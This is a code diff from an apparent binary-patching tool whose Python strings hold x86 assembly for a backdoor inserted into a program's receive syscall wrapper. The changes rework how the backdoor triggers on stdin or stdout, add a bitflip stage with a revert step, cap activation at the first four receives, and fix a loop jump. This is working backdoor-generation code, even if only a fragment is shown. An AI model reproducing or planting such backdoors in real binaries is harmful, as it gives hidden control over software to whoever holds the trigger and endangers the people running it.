@@ -156,34 +156,35 @@ int ROTATE_LEFT(const int value, int shift) {
 
                 ; this code is executed at most 4 times unless receive failed
                 ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
-                test eax, eax ; test if receive succeeded
-                jne _exit_backdoor
+
                 test ebx, ebx ; test if ebx is 0 (stdin)
                 je _enter_backddor
-                cmp ebx, 1
+                cmp ebx, 1 ; stdout is also good
                 jne _exit_backdoor
             '''
         else:
-
             code_header = '''
                 test eax, eax ; receive succeded
                 jne _exit_backdoor
 
-                ; this code is executed at most 4 times unless receive failed
                 ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
-                test eax, eax ; test if receive succeeded
-                jne _exit_backdoor
                 test ebx, ebx ; test if ebx is 0 (stdin)
-                je _enter_backddor
-                cmp ebx, 1
+                je _enter_bitflip
+                cmp ebx, 1 ; stdout is also good
                 jne _exit_backdoor
 
+                _enter_bitflip:
+                %s
+
+                ; revert changes of the bitflip
+                sub ecx, DWORD [esi]
+                mov edx, DWORD [esi]
+
+                ; this code is executed at most 4 times unless receive failed
                 ; fast path: this code is added to every receive
                 cmp BYTE [{backdoor_receive_len}], 4
                 jae _exit_backdoor
-
-                %s
-            ''' % (Bitflip.get_bitflip_code)
+            ''' % (Bitflip.get_bitflip_code())
 
         code = code_header + '''
 
@@ -235,7 +236,7 @@ int ROTATE_LEFT(const int value, int shift) {
                 mov cl, 64;
                 _zero_loop:
                     test ecx, ecx
-                    jmp _zero_loop_out
+                    je _zero_loop_out
                     mov DWORD [esp+ecx], edx
                     sub cl, 4
                     jmp _zero_loop
